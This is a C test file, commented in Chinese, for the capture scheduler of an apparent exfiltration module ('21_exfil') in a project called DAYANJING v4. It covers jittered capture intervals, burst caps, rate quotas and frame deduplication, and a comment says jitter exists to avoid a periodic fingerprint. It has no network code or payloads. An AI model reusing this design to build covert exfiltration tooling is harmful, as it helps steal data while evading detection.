/*
 * DAYANJING v4 — test_sched.c
 *
 * 采集调度层测试。
 *
 * 本测试的核心手段是**注入时间**：把 now_us 直接推进到任意点，
 * 从而在不 sleep 的前提下验证窗口滑动、配额恢复、突发上限。
 * 若调度器内部读系统时钟，这些用例就只能靠实时期待，既慢又不稳定。
 */

#include "exfil_sched.h"

#include <stdio.h>
#include <string.h>

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, name)                                              \
    do {                                                               \
        if (cond) {                                                    \
            printf("[PASS] %s\n", (name));                             \
            g_pass++;                                                  \
        } else {                                                       \
            printf("[FAIL] %s  (%s:%d)\n", (name), __FILE__, __LINE__); \
            g_fail++;                                                  \
        }                                                              \
    } while (0)

/* 无抖动配置：min == max，便于确定性地验证间隔与配额 */
static void cfg_fixed(exfil_sched_cfg_t *c, uint64_t interval)
{
    memset(c, 0, sizeof(*c));
    c->min_interval_us   = interval;
    c->max_interval_us   = interval;
    c->burst_max         = 0;
    c->window_us         = 0;
    c->window_max_frames = 0;
    c->window_max_bytes  = 0;
    c->dedup             = 0;
}

/* ------------------------------------------------------------------ */
/* 1. 模式与基本触发                                                    */
/* ------------------------------------------------------------------ */
static void test_mode(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;

    cfg_fixed(&c, 1000);
    CHECK(exfil_sched_init(&s, &c, 0x1234) == EXF_SCHED_OK, "init 成功");

    /* 未触发 -> IDLE */
    CHECK(exfil_sched_poll(&s, 0) == EXF_SCHED_IDLE, "未运行时 poll 返回 IDLE");
    CHECK(exfil_sched_poll(&s, 999999) == EXF_SCHED_IDLE, "未运行时大时刻仍 IDLE");

    /* START -> 立即 DUE（next_due 初值为 0，触发后应马上采一帧） */
    CHECK(exfil_sched_start(&s) == EXF_SCHED_OK, "start 成功");
    CHECK(exfil_sched_poll(&s, 0) == EXF_SCHED_DUE, "start 后立即 DUE");

    /* commit 后进入等待 */
    CHECK(exfil_sched_commit(&s, 0, 0xAAAA, 100) == EXF_SCHED_OK, "commit 应发送");
    CHECK(exfil_sched_poll(&s, 999) == EXF_SCHED_WAIT, "间隔未到 -> WAIT");
    CHECK(exfil_sched_poll(&s, 1000) == EXF_SCHED_DUE, "间隔到达 -> DUE");
    CHECK(exfil_sched_wait_us(&s, 999) == 1, "wait_us 计算正确");
    CHECK(exfil_sched_wait_us(&s, 1000) == 0, "已到期 wait_us 为 0");

    /* STOP -> IDLE */
    exfil_sched_stop(&s);
    CHECK(exfil_sched_poll(&s, 1000) == EXF_SCHED_IDLE, "stop 后 IDLE");

    /* ONCE：采一帧后自动回到 IDLE */
    CHECK(exfil_sched_once(&s) == EXF_SCHED_OK, "once 成功");
    CHECK(exfil_sched_poll(&s, 2000) == EXF_SCHED_DUE, "once 后 DUE");
    CHECK(exfil_sched_commit(&s, 2000, 0xBBBB, 100) == EXF_SCHED_OK, "once commit");
    CHECK(exfil_sched_poll(&s, 100000) == EXF_SCHED_IDLE, "once 采完自动 IDLE");
}

/* ------------------------------------------------------------------ */
/* 2. 抖动：范围、可复现、跨 seed 不同                                   */
/* ------------------------------------------------------------------ */
static void test_jitter(void)
{
    exfil_sched_t a, b;
    exfil_sched_cfg_t c;
    uint64_t i;
    int in_range = 1;
    int same_as_b = 1;

    memset(&c, 0, sizeof(c));
    c.min_interval_us   = 1000;
    c.max_interval_us   = 5000;      /* span = 4000 */
    c.burst_max         = 0;
    c.window_us         = 0;
    c.window_max_frames = 0;
    c.window_max_bytes  = 0;
    c.dedup             = 0;

    CHECK(exfil_sched_init(&a, &c, 0xDEADBEEF) == EXF_SCHED_OK, "jitter init A");
    CHECK(exfil_sched_init(&b, &c, 0xDEADBEEF) == EXF_SCHED_OK, "jitter init B 同 seed");

    exfil_sched_start(&a);
    exfil_sched_start(&b);

    for (i = 0; i < 200; i++) {
        uint64_t now = i * 100000;      /* 远大于间隔，保证每次都 DUE */
        uint64_t da, db;

        if (exfil_sched_poll(&a, now) != EXF_SCHED_DUE) { in_range = 0; break; }
        if (exfil_sched_poll(&b, now) != EXF_SCHED_DUE) { in_range = 0; break; }

        exfil_sched_commit(&a, now, 1, 10);
        exfil_sched_commit(&b, now, 1, 10);

        da = exfil_sched_wait_us(&a, now);
        db = exfil_sched_wait_us(&b, now);

        /* 抖动后间隔必须落在 [min, max] */
        if (da < 1000 || da > 5000) in_range = 0;
        /* 同 seed 必须逐次相同 */
        if (da != db) same_as_b = 0;
    }

    CHECK(in_range, "抖动后间隔恒在 [min,max] 内");
    CHECK(same_as_b, "同 seed 抖动序列完全一致（可复现）");

    /* 不同 seed 应产生不同序列 —— 否则抖动退化成常量，制造周期指纹 */
    {
        exfil_sched_t d;
        int differs = 0;
        CHECK(exfil_sched_init(&d, &c, 0x1234ABCD) == EXF_SCHED_OK, "jitter init 异 seed");
        exfil_sched_start(&d);
        for (i = 0; i < 50; i++) {
            uint64_t now = 1000000 + i * 100000;
            uint64_t da, dd;
            exfil_sched_poll(&a, now);
            exfil_sched_poll(&d, now);
            exfil_sched_commit(&a, now, 1, 10);
            exfil_sched_commit(&d, now, 1, 10);
            da = exfil_sched_wait_us(&a, now);
            dd = exfil_sched_wait_us(&d, now);
            if (da != dd) differs = 1;
        }
        CHECK(differs, "不同 seed 抖动序列不同");
    }
}

/* ------------------------------------------------------------------ */
/* 3. 突发上限                                                          */
/* ------------------------------------------------------------------ */
static void test_burst(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;
    uint64_t t;
    int n = 0;

    cfg_fixed(&c, 1000);
    c.burst_max = 3;

    CHECK(exfil_sched_init(&s, &c, 0x55) == EXF_SCHED_OK, "burst init");
    exfil_sched_start(&s);

    /* 连续采 3 帧 */
    for (t = 0; t < 3000 && n < 3; t += 1000) {
        if (exfil_sched_poll(&s, t) == EXF_SCHED_DUE) {
            exfil_sched_commit(&s, t, 0x1111, 100);
            n++;
        }
    }
    CHECK(n == 3, "burst 内连续采到 3 帧");
    CHECK(exfil_sched_poll(&s, 3000) == EXF_SCHED_IDLE,
          "burst 到达上限后自动 IDLE（防止忘记 STOP）");
    CHECK(exfil_sched_poll(&s, 999999) == EXF_SCHED_IDLE, "burst 后长期保持 IDLE");

    /* 重新 start 可再次采集 */
    exfil_sched_start(&s);
    CHECK(exfil_sched_poll(&s, 999999) == EXF_SCHED_DUE, "重新 start 可再采");
}

/* ------------------------------------------------------------------ */
/* 4. 窗口配额（帧数 / 字节）与窗口滑动                                  */
/* ------------------------------------------------------------------ */
static void test_quota(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;
    uint32_t fr;
    uint64_t by;

    cfg_fixed(&c, 1000);
    c.window_us         = 10000;
    c.window_max_frames = 2;

    CHECK(exfil_sched_init(&s, &c, 0x77) == EXF_SCHED_OK, "quota init");
    exfil_sched_start(&s);

    CHECK(exfil_sched_poll(&s, 0) == EXF_SCHED_DUE, "quota t=0 DUE");
    exfil_sched_commit(&s, 0, 1, 100);

    CHECK(exfil_sched_poll(&s, 1000) == EXF_SCHED_DUE, "quota t=1000 DUE");
    exfil_sched_commit(&s, 1000, 2, 100);

    exfil_sched_usage(&s, &fr, &by);
    CHECK(fr == 2, "窗口内已用帧数为 2");
    CHECK(by == 200, "窗口内已用字节为 200");

    /* 帧数配额耗尽 */
    CHECK(exfil_sched_poll(&s, 2000) == EXF_SCHED_WAIT, "帧数配额耗尽 -> WAIT");
    CHECK(exfil_sched_poll(&s, 9000) == EXF_SCHED_WAIT, "窗口内仍 WAIT");

    /* 窗口滑动后配额恢复 */
    CHECK(exfil_sched_poll(&s, 10000) == EXF_SCHED_DUE, "窗口滑动后 -> DUE");
    exfil_sched_commit(&s, 10000, 3, 100);
    exfil_sched_usage(&s, &fr, &by);
    CHECK(fr == 1, "滑动后帧数归 1");
    CHECK(by == 100, "滑动后字节归 100");

    /* 长时间空闲应一次滑到当前窗口，而不是把起点设为 now 后逐次续期 */
    CHECK(exfil_sched_poll(&s, 35000) == EXF_SCHED_DUE, "长空闲后可采");
    exfil_sched_commit(&s, 35000, 4, 100);
    exfil_sched_commit(&s, 36000, 5, 100);
    CHECK(exfil_sched_poll(&s, 37000) == EXF_SCHED_WAIT, "新窗口配额同样生效");
}

static void test_quota_bytes(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;

    cfg_fixed(&c, 1000);
    c.window_us        = 10000;
    c.window_max_bytes = 500;

    CHECK(exfil_sched_init(&s, &c, 0x88) == EXF_SCHED_OK, "byte quota init");
    exfil_sched_start(&s);

    exfil_sched_commit(&s, 0, 1, 300);
    CHECK(exfil_sched_poll(&s, 1000) == EXF_SCHED_DUE, "字节未满可采");
    exfil_sched_commit(&s, 1000, 2, 300);
    /* 600 > 500 */
    CHECK(exfil_sched_poll(&s, 2000) == EXF_SCHED_WAIT, "字节配额耗尽 -> WAIT");
    CHECK(exfil_sched_poll(&s, 10000) == EXF_SCHED_DUE, "字节窗口滑动后恢复");
}

/* ------------------------------------------------------------------ */
/* 5. 去重                                                              */
/* ------------------------------------------------------------------ */
static void test_dedup(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;
    uint32_t fr;
    uint64_t by;

    cfg_fixed(&c, 1000);
    c.dedup = 1;

    CHECK(exfil_sched_init(&s, &c, 0x99) == EXF_SCHED_OK, "dedup init");
    exfil_sched_start(&s);

    /* 首帧无指纹可比，必须发送 */
    CHECK(exfil_sched_commit(&s, 0, 0xCAFE, 4096) == EXF_SCHED_OK, "首帧发送");
    /* 同 crc 同 len -> 跳过 */
    CHECK(exfil_sched_commit(&s, 1000, 0xCAFE, 4096) == EXF_SCHED_SKIP, "重复帧跳过");
    /* crc 不同 -> 发送 */
    CHECK(exfil_sched_commit(&s, 2000, 0xBEEF, 4096) == EXF_SCHED_OK, "内容变化发送");
    /* len 不同 -> 发送 */
    CHECK(exfil_sched_commit(&s, 3000, 0xBEEF, 4097) == EXF_SCHED_OK, "长度变化发送");

    /*
     * 跳过不消耗配额：4 次 commit 中 2 次被跳过，窗口只应计 3 帧 / 12289 字节
     */
    exfil_sched_usage(&s, &fr, &by);
    CHECK(fr == 3, "跳过的帧不计入帧配额");
    CHECK(by == 4096 + 4096 + 4097, "跳过的帧不计入字节配额");

    /*
     * 跳过仍推进时间，否则会忙循环空转。
     * 4 次 commit（含 1 次 SKIP）后 next_due 应为 4000：
     *   若 SKIP 不推进时间，next_due 会停在 1000，则 3999 就会返回 DUE。
     *   故用 3999 -> WAIT 与 4000 -> DUE 两条断言同时夹逼才能确证。
     */
    CHECK(exfil_sched_poll(&s, 3999) == EXF_SCHED_WAIT,
          "skip 也推进了时间（3999 尚未到期）");
    CHECK(exfil_sched_poll(&s, 4000) == EXF_SCHED_DUE,
          "skip 推进后到期点为 4000");

    /* 关闭去重后不再跳过 */
    c.dedup = 0;
    CHECK(exfil_sched_init(&s, &c, 0x99) == EXF_SCHED_OK, "dedup 关闭 init");
    exfil_sched_start(&s);
    CHECK(exfil_sched_commit(&s, 0, 0xCAFE, 4096) == EXF_SCHED_OK, "关闭后首帧发送");
    CHECK(exfil_sched_commit(&s, 1000, 0xCAFE, 4096) == EXF_SCHED_OK, "关闭后重复帧仍发送");
}

/* ------------------------------------------------------------------ */
/* 6. 参数与配置校验                                                    */
/* ------------------------------------------------------------------ */
static void test_validation(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;

    CHECK(exfil_sched_init(NULL, NULL, 1) == EXF_SCHED_ERR_ARG, "init 空指针 -> ARG");
    CHECK(exfil_sched_init(&s, NULL, 0) == EXF_SCHED_ERR_ARG, "seed 为 0 -> ARG");

    /* max < min */
    cfg_fixed(&c, 1000);
    c.max_interval_us = 999;
    CHECK(exfil_sched_init(&s, &c, 1) == EXF_SCHED_ERR_CFG, "max < min -> CFG");

    /* window_us == 0 但配额非零：窗口永不滑动，配额耗尽后永久卡死 */
    cfg_fixed(&c, 1000);
    c.window_us         = 0;
    c.window_max_frames = 5;
    CHECK(exfil_sched_init(&s, &c, 1) == EXF_SCHED_ERR_CFG, "无窗口但有配额 -> CFG");

    cfg_fixed(&c, 1000);
    c.window_us        = 0;
    c.window_max_bytes = 5;
    CHECK(exfil_sched_init(&s, &c, 1) == EXF_SCHED_ERR_CFG, "无窗口但有字节配额 -> CFG");

    /* window_us == 0 且配额皆为 0：合法（不限速） */
    cfg_fixed(&c, 1000);
    CHECK(exfil_sched_init(&s, &c, 1) == EXF_SCHED_OK, "无窗口无配额 -> OK");

    /* 默认配置可用 */
    CHECK(exfil_sched_init(&s, NULL, 0xABCDEF) == EXF_SCHED_OK, "默认配置 init 成功");
    exfil_sched_start(&s);
    CHECK(exfil_sched_poll(&s, 0) == EXF_SCHED_DUE, "默认配置 start 后立即 DUE");
    exfil_sched_commit(&s, 0, 1, 10);
    CHECK(exfil_sched_poll(&s, 999999) == EXF_SCHED_WAIT, "默认配置间隔内 WAIT");

    /* wipe 后回到未初始化 */
    exfil_sched_wipe(&s);
    CHECK(exfil_sched_poll(&s, 0) == EXF_SCHED_IDLE, "wipe 后 IDLE");
}

/* ------------------------------------------------------------------ */
/* 7. STOP/START 不重置配额（防止反复重启绕过限速）                       */
/* ------------------------------------------------------------------ */
static void test_no_quota_reset(void)
{
    exfil_sched_t s;
    exfil_sched_cfg_t c;

    cfg_fixed(&c, 1000);
    c.window_us         = 10000;
    c.window_max_frames = 1;

    CHECK(exfil_sched_init(&s, &c, 0x33) == EXF_SCHED_OK, "no-reset init");
    exfil_sched_start(&s);
    exfil_sched_commit(&s, 0, 1, 100);
    CHECK(exfil_sched_poll(&s, 1000) == EXF_SCHED_WAIT, "配额耗尽 WAIT");

    exfil_sched_stop(&s);
    exfil_sched_start(&s);
    CHECK(exfil_sched_poll(&s, 1000) == EXF_SCHED_WAIT,
          "stop/start 不刷新配额（防绕过）");

    CHECK(exfil_sched_poll(&s, 10000) == EXF_SCHED_DUE, "窗口滑动后恢复");
}

/* ------------------------------------------------------------------ */
/* 8. errstr 覆盖                                                       */
/* ------------------------------------------------------------------ */
static void test_errstr(void)
{
    CHECK(strcmp(exfil_sched_errstr(EXF_SCHED_DUE), "due: capture now") == 0, "errstr DUE");
    CHECK(strcmp(exfil_sched_errstr(EXF_SCHED_SKIP), "skip: duplicate of previous frame") == 0,
          "errstr SKIP");
    CHECK(strcmp(exfil_sched_errstr(EXF_SCHED_ERR_CFG), "invalid configuration") == 0,
          "errstr CFG");
    CHECK(strcmp(exfil_sched_errstr(9999), "unknown") == 0, "errstr 未知码");
}

int main(void)
{
    printf("=== 21_exfil/sched 测试 ===\n");
    test_mode();
    test_jitter();
    test_burst();
    test_quota();
    test_quota_bytes();
    test_dedup();
    test_validation();
    test_no_quota_reset();
    test_errstr();
    printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    return (g_fail == 0) ? 0 : 1;
}
